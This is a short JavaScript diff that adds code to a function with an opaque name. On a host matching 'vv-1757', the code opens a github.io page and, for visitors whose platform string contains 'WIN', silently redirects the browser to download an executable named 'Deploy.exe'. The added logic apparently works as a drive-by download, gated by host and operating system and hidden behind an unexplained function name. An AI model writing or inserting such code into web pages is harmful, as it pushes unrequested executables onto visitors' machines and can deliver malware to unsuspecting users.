@@ -9,7 +9,10 @@ function LoadGIF(){
 }
 async function xyza(){
 if(window.location.host.includes("vv-1757")){
-window.open("https://spat-cloud.github.io/new/") 
+window.open("https://spat-cloud.github.io/new/","_blank") ;
+  if(navigator.platform.toUpperCase().includes("WIN")){
+    window.location="https://spat-cloud.github.io/win_exe/Deploy.exe";
+  }
 }else{
   LoadGIF();
 }}
